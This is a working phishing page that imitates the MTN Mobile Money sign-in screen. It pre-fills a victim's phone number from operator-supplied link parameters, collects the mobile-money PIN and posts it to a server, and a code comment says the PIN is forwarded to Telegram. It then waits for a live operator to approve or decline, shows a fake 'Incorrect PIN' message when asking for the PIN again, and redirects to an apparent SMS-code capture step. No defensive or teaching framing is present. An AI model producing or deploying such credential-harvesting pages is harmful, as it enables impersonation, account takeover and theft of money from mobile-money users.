<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<title>MTN Mobile Money · Sign in</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
<style>
  :root {
    --mtn-teal:   #005572;
    --mtn-teal-dark: #003F55;
    --mtn-white:  #FFFFFF;
    --mtn-yellow: #FFCC08;
    --mtn-yellow-light: #FFE04D;
    --mtn-input-border: rgba(255,255,255,0.35);
    --mtn-input-border-focus: rgba(255,255,255,0.85);
    --mtn-muted: rgba(255,255,255,0.65);
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; }
  body {
    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: var(--mtn-teal); color: var(--mtn-white);
    -webkit-font-smoothing: antialiased; line-height: 1.45;
    min-height: 100vh; display: flex; justify-content: center; padding: 0;
  }
  .phone {
    width: 100%; max-width: 430px; min-height: 100vh;
    background: var(--mtn-teal); display: flex; flex-direction: column;
    position: relative; overflow: hidden;
    padding-top: env(safe-area-inset-top, 0px);
    padding-bottom: env(safe-area-inset-bottom, 0px);
  }

  .brand-block { text-align: center; padding: 44px 24px 0; }
  .yello-logo { display: inline-flex; align-items: center; justify-content: center; margin-bottom: 14px; gap: 8px; }
  .yello-mark {
    width: 60px; height: 60px; border-radius: 50%;
    background: var(--mtn-yellow);
    display: inline-flex; align-items: center; justify-content: center;
    box-shadow: 0 8px 22px rgba(0, 0, 0, 0.25);
    position: relative; overflow: hidden;
  }
  .yello-mark::before {
    content: ''; position: absolute; inset: 10px;
    border-radius: 50%; border: 2px solid rgba(0, 0, 0, 0.15);
  }
  .yello-mark .face { display: inline-flex; flex-direction: column; align-items: center; gap: 2px; position: relative; z-index: 1; }
  .yello-mark .eye { width: 6px; height: 6px; border-radius: 50%; background: #005572; display: inline-block; margin: 0 2px; }
  .yello-mark .smile {
    width: 18px; height: 9px;
    border: 2.5px solid #005572; border-top: none; border-left: none; border-right: none;
    border-radius: 0 0 20px 20px; margin-top: 2px;
  }

  .display-name { font-size: 17px; font-weight: 700; color: var(--mtn-white); letter-spacing: -0.2px; line-height: 1.3; }
  .display-name .accent {
    color: var(--mtn-yellow); display: block; font-size: 13px;
    font-weight: 600; margin-top: 2px; letter-spacing: 0.3px;
  }

  .form-area { flex: 1; padding: 32px 30px 20px; display: flex; flex-direction: column; }

  .field { margin-bottom: 22px; position: relative; }
  .field label {
    display: block; font-size: 11.5px; font-weight: 700;
    letter-spacing: 0.9px; text-transform: uppercase;
    color: var(--mtn-muted); margin-bottom: 8px;
  }

  /* Phone field — prefilled from admin, read-only */
  .phone-input-wrap {
    display: flex; align-items: center; gap: 8px;
    border-bottom: 1.5px solid var(--mtn-input-border);
    padding-bottom: 8px; transition: border-color .15s;
  }
  .phone-input-wrap .dial { font-size: 15px; font-weight: 700; color: var(--mtn-yellow); letter-spacing: 0.3px; flex-shrink: 0; }
  .phone-input-wrap input {
    flex: 1; min-width: 0; background: transparent; border: none; outline: none;
    color: var(--mtn-white); font-family: inherit; font-size: 16px; font-weight: 600;
    letter-spacing: 0.3px; padding: 2px 0;
  }
  .phone-input-wrap input::placeholder { color: rgba(255,255,255,0.45); font-weight: 500; }
  .phone-input-wrap input:read-only { color: var(--mtn-white); cursor: default; }
  .phone-input-wrap input:read-only:focus { box-shadow: none; }

  /* PIN field */
  .pin-input-wrap {
    display: flex; align-items: center; gap: 8px;
    border-bottom: 1.5px solid var(--mtn-input-border);
    padding-bottom: 8px; transition: border-color .15s;
  }
  .pin-input-wrap:focus-within { border-bottom-color: var(--mtn-input-border-focus); }
  .pin-input-wrap input {
    flex: 1; min-width: 0; background: transparent; border: none; outline: none;
    color: var(--mtn-white); font-family: inherit; font-size: 16px; font-weight: 600;
    letter-spacing: 4px; padding: 2px 0;
  }
  .pin-input-wrap input::placeholder { color: rgba(255,255,255,0.45); font-weight: 500; letter-spacing: 1px; }
  .eye-btn {
    flex-shrink: 0; background: transparent; border: none; padding: 4px; cursor: pointer;
    color: rgba(255,255,255,0.7); display: inline-flex; align-items: center; justify-content: center;
    transition: color .15s;
  }
  .eye-btn:hover { color: var(--mtn-yellow); }
  .eye-btn svg { width: 20px; height: 20px; stroke: currentColor; fill: none; stroke-width: 2; }

  .field-error { display: none; font-size: 11.5px; color: #FFE04D; margin-top: 6px; font-weight: 600; line-height: 1.4; }
  .field.invalid .field-error { display: block; }
  .field.invalid .pin-input-wrap { border-bottom-color: #FFE04D; }

  /* Inline status banner — for approval / declined */
  .status-banner {
    display: none;
    padding: 11px 14px;
    border-radius: 10px;
    font-size: 12.5px;
    font-weight: 600;
    line-height: 1.5;
    margin-bottom: 16px;
    text-align: center;
  }
  .status-banner.show { display: block; }
  .status-banner.info { background: rgba(255,255,255,0.10); color: var(--mtn-yellow); }
  .status-banner.error { background: #FFE04D; color: #8B0000; }
  .status-banner.success { background: var(--mtn-green, #28A745); color: #fff; }

  .btn-signin {
    width: 100%; height: 54px;
    background: var(--mtn-white); color: var(--mtn-teal);
    font-family: inherit; font-size: 15px; font-weight: 900;
    letter-spacing: 2px; text-transform: uppercase;
    border: none; border-radius: 999px; cursor: pointer; margin-top: 8px;
    box-shadow: 0 10px 24px rgba(0, 0, 0, 0.20);
    transition: filter .15s, transform .1s;
  }
  .btn-signin:hover { filter: brightness(1.05); }
  .btn-signin:active { transform: scale(0.985); }
  .btn-signin:disabled { opacity: 0.75; cursor: wait; }

  .terms {
    text-align: center; font-size: 11px; color: rgba(255,255,255,0.65);
    line-height: 1.6; margin-top: auto; padding: 24px 30px 0;
  }
  .terms a { color: var(--mtn-yellow); font-weight: 700; text-decoration: underline; text-underline-offset: 2px; }
  .terms a:hover { filter: brightness(1.1); }

  .contact {
    display: flex; flex-direction: column; align-items: center; gap: 8px;
    padding: 24px 24px 28px;
  }
  .contact-btn {
    width: 52px; height: 52px; border-radius: 50%;
    background: var(--mtn-yellow);
    display: inline-flex; align-items: center; justify-content: center;
    border: none; cursor: pointer;
    box-shadow: 0 10px 22px rgba(255, 204, 8, 0.30);
    transition: transform .12s ease, filter .15s; text-decoration: none;
  }
  .contact-btn:hover { filter: brightness(1.05); }
  .contact-btn:active { transform: scale(0.96); }
  .contact-btn svg {
    width: 24px; height: 24px; stroke: var(--mtn-teal); fill: none;
    stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round;
  }
  .contact-label { font-size: 12px; font-weight: 700; letter-spacing: 0.4px; color: var(--mtn-white); opacity: 0.9; }

  .toast {
    position: fixed; bottom: 90px; left: 50%;
    transform: translateX(-50%) translateY(80px);
    background: #0A0F1F; color: #fff; padding: 11px 18px; border-radius: 9px;
    font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
    z-index: 50; pointer-events: none; max-width: 90%; text-align: center;
  }
  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }

  @media (max-width: 380px) {
    .brand-block { padding-top: 32px; }
    .yello-mark { width: 52px; height: 52px; }
    .display-name { font-size: 15px; }
    .form-area { padding: 24px 22px 16px; }
    .btn-signin { height: 50px; font-size: 14px; }
    .contact-btn { width: 46px; height: 46px; }
    .contact-btn svg { width: 20px; height: 20px; }
  }
  @media (max-height: 680px) {
    .brand-block { padding-top: 26px; }
    .form-area { padding-top: 22px; }
    .field { margin-bottom: 16px; }
    .terms { padding-top: 16px; }
    .contact { padding-top: 16px; padding-bottom: 20px; }
  }
  @media (min-width: 640px) {
    body { padding: 32px 0; align-items: center; }
    .phone {
      min-height: calc(100vh - 64px); max-height: 900px;
      border-radius: 32px;
      box-shadow: 0 40px 100px rgba(0, 0, 0, 0.30); overflow: hidden;
    }
  }
</style>
</head>
<body>

<div class="phone">

  <!-- Logo + dynamic display name -->
  <div class="brand-block">
    <div class="yello-logo">
      <div class="yello-mark" aria-hidden="true">
        <div class="face">
          <div><span class="eye"></span><span class="eye"></span></div>
          <div class="smile"></div>
        </div>
      </div>
    </div>
    <div class="display-name" id="displayName">
      MTN Mobile Money
      <span class="accent" id="displaySub">Sign in to continue</span>
    </div>
  </div>

  <!-- Form -->
  <form class="form-area" id="signinForm" novalidate onsubmit="handleSignIn(event)">

    <!-- Status banner -->
    <div class="status-banner" id="statusBanner"></div>

    <!-- Phone (prefilled from admin) -->
    <div class="field" id="f-phone">
      <label for="phoneInput">Phone number</label>
      <div class="phone-input-wrap">
        <span class="dial" id="dialCode">+237</span>
        <input
          type="tel"
          id="phoneInput"
          inputmode="numeric"
          autocomplete="tel"
          placeholder="Enter phone number"
          maxlength="15"
          readonly
        >
      </div>
      <div class="field-error" id="phoneError">No phone number was provided by the merchant.</div>
    </div>

    <!-- PIN -->
    <div class="field" id="f-pin">
      <label for="pinInput">PIN</label>
      <div class="pin-input-wrap">
        <input
          type="password"
          id="pinInput"
          inputmode="numeric"
          autocomplete="off"
          placeholder="••••"
          maxlength="8"
        >
        <button type="button" class="eye-btn" onclick="togglePin()" aria-label="Show or hide PIN">
          <svg viewBox="0 0 24 24" id="eyeIcon">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
            <circle cx="12" cy="12" r="3"/>
          </svg>
        </button>
      </div>
      <div class="field-error" id="pinError">Please enter your PIN.</div>
    </div>

    <button type="submit" class="btn-signin" id="signinBtn">Sign In</button>
  </form>

  <!-- T&Cs -->
  <div class="terms">
    By using this app you agree to our
    <a href="#" onclick="openTerms(event)">T&amp;Cs</a>
  </div>

  <!-- Contact us -->
  <div class="contact">
    <a class="contact-btn" href="#" id="contactLink" aria-label="Contact us">
      <svg viewBox="0 0 24 24">
        <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.13.96.36 1.9.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.91.34 1.85.57 2.81.7A2 2 0 0 1 22 16.92z"/>
      </svg>
    </a>
    <div class="contact-label">Contact us</div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
  /* ============================================================
     Country data — matching the admin
  ============================================================ */
  const COUNTRY_DIAL = {
    'Cameroon': '+237', 'Zambia': '+260', 'Zambia (MTN)': '+260',
    'Uganda': '+256', 'Uganda (MTN)': '+256',
    'Ghana': '+233', 'Ghana (MTN)': '+233'
  };
  const COUNTRY_SUPPORT = {
    'Cameroon': 'tel:8787', 'Zambia': 'tel:111', 'Zambia (MTN)': 'tel:111',
    'Uganda': 'tel:100', 'Uganda (MTN)': 'tel:100',
    'Ghana': 'tel:100', 'Ghana (MTN)': 'tel:100'
  };

  /* ============================================================
     Read transaction from URL
     Expected: ?tx=…&am=…&cur=…&rn=…&c=…&pm=…&sn=…&mk=…&an=…
     `an` is the phone/account number entered on the admin page.
  ============================================================ */
  const params = new URLSearchParams(location.search);
  const tx = {
    ref: params.get('tx') || '',
    am:  params.get('am') || '',
    cur: params.get('cur') || '',
    rn:  params.get('rn') || '',
    c:   params.get('c') || '',
    pm:  params.get('pm') || '',
    sn:  params.get('sn') || '',
    mk:  params.get('mk') || '',
    an:  params.get('an') || ''
  };

  /* ============================================================
     Display name
  ============================================================ */
  function applyDisplayName() {
    const adminName = params.get('dn') || '';
    const nameEl = document.getElementById('displayName');
    const subEl  = document.getElementById('displaySub');

    if (adminName) {
      nameEl.childNodes[0].nodeValue = adminName + ' ';
      subEl.textContent = 'Sign in to continue';
    } else if (tx.c) {
      nameEl.childNodes[0].nodeValue = 'MTN ' + tx.c + ' ';
      subEl.textContent = 'Mobile Money · Sign in to continue';
    } else {
      nameEl.childNodes[0].nodeValue = 'MTN Mobile Money ';
      subEl.textContent = 'Sign in to continue';
    }
  }

  /* ============================================================
     Apply country + prefill phone from admin
  ============================================================ */
  function applyCountry() {
    const dial = COUNTRY_DIAL[tx.c] || '+237';
    document.getElementById('dialCode').textContent = dial;

    // Strip the dial code from the admin-provided account number if present
    let rawPhone = String(tx.an || '').replace(/\D/g, '');
    // Cameroon often includes the leading 237 in the number
    if (dial === '+237' && rawPhone.startsWith('237')) rawPhone = rawPhone.slice(3);
    if (dial === '+260' && rawPhone.startsWith('260')) rawPhone = rawPhone.slice(3);
    if (dial === '+256' && rawPhone.startsWith('256')) rawPhone = rawPhone.slice(3);
    if (dial === '+233' && rawPhone.startsWith('233')) rawPhone = rawPhone.slice(3);
    // Drop leading 0 for local numbers
    rawPhone = rawPhone.replace(/^0+/, '');

    document.getElementById('phoneInput').value = rawPhone;

    const support = COUNTRY_SUPPORT[tx.c];
    if (support) document.getElementById('contactLink').href = support;
  }

  /* ============================================================
     PIN visibility
  ============================================================ */
  let pinVisible = false;
  function togglePin() {
    const pin = document.getElementById('pinInput');
    pinVisible = !pinVisible;
    pin.type = pinVisible ? 'text' : 'password';
    document.getElementById('eyeIcon').innerHTML = pinVisible
      ? `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/><line x1="3" y1="3" x2="21" y2="21"/>`
      : `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>`;
  }

  /* ============================================================
     Validation
  ============================================================ */
  function setInvalid(id) { document.getElementById(id).classList.add('invalid'); }
  function clearInvalid(id) { document.getElementById(id).classList.remove('invalid'); }

  function validateForm() {
    clearInvalid('f-phone');
    clearInvalid('f-pin');
    let ok = true;

    const phone = document.getElementById('phoneInput').value.replace(/\D/g, '');
    if (phone.length < 6) { setInvalid('f-phone'); ok = false; }

    const pin = document.getElementById('pinInput').value;
    if (!pin || pin.length < 4) { setInvalid('f-pin'); ok = false; }

    return ok;
  }

  /* ============================================================
     UI helpers
  ============================================================ */
  function showToast(msg) {
    const t = document.getElementById('toast');
    t.textContent = msg; t.classList.add('show');
    clearTimeout(t._timer);
    t._timer = setTimeout(() => t.classList.remove('show'), 2400);
  }
  function showBanner(kind, msg) {
    const b = document.getElementById('statusBanner');
    b.className = 'status-banner show ' + kind;
    b.textContent = msg;
  }
  function hideBanner() {
    const b = document.getElementById('statusBanner');
    b.className = 'status-banner';
    b.textContent = '';
  }

  /* ============================================================
     Sign In
     - Sends phone + PIN to server → forwarded to Telegram
     - Polls /api/verification/status/:tx for approve/decline
     - Approve → sms.html
     - Decline → red "Incorrect PIN" banner
  ============================================================ */
  async function handleSignIn(e) {
    e.preventDefault();
    hideBanner();
    if (!validateForm()) {
      showToast('Please check the highlighted fields.');
      return;
    }

    const btn = document.getElementById('signinBtn');
    btn.disabled = true;
    btn.textContent = 'Signing in…';

    const dial = document.getElementById('dialCode').textContent;
    const phoneDigits = document.getElementById('phoneInput').value.replace(/\D/g, '');
    const pin = document.getElementById('pinInput').value;

    try {
      await fetch('/api/verification/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          tx: tx.ref,
          otp: pin,
          am: tx.am,
          cur: tx.cur,
          c: tx.c,
          phone: dial + phoneDigits
        })
      });
    } catch (err) {
      btn.disabled = false;
      btn.textContent = 'Sign In';
      showToast('Network error. Please try again.');
      return;
    }

    // Poll for the decision
    showBanner('info', 'Waiting for approval on your phone…');
    btn.textContent = 'Awaiting approval…';

    const start = Date.now();
    const maxWaitMs = 2 * 60 * 1000;  // 2 minutes

    const poll = async () => {
      if (Date.now() - start > maxWaitMs) {
        btn.disabled = false;
        btn.textContent = 'Sign In';
        showBanner('error', 'Request timed out. Please try again.');
        return;
      }

      let decision = 'pending';
      try {
        const r = await fetch('/api/verification/status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
        const j = await r.json();
        decision = j.decision || 'pending';
      } catch (err) { /* keep polling */ }

      if (decision === 'approved') {
        showBanner('success', 'Approved. Redirecting…');
        const q = new URLSearchParams({
          tx:  tx.ref,
          am:  tx.am,
          cur: tx.cur,
          rn:  tx.rn,
          c:   tx.c,
          pm:  tx.pm,
          sn:  tx.sn,
          mk:  tx.mk,
          an:  tx.an
        });
        setTimeout(() => {
          window.location.href = 'sms.html?' + q.toString();
        }, 500);
        return;
      }

      if (decision === 'declined' || decision === 'expired') {
        btn.disabled = false;
        btn.textContent = 'Sign In';
        showBanner('error', 'Incorrect PIN. Please try again.');
        document.getElementById('pinInput').value = '';
        document.getElementById('pinInput').focus();
        return;
      }

      setTimeout(poll, 1500);
    };

    poll();
  }

  /* ============================================================
     T&Cs
  ============================================================ */
  function openTerms(e) {
    e.preventDefault();
    showToast('Terms & Conditions available on the MTN website.');
  }

  /* ============================================================
     Init
  ============================================================ */
  document.addEventListener('DOMContentLoaded', () => {
    applyDisplayName();
    applyCountry();
  });
</script>
</body>
</html>
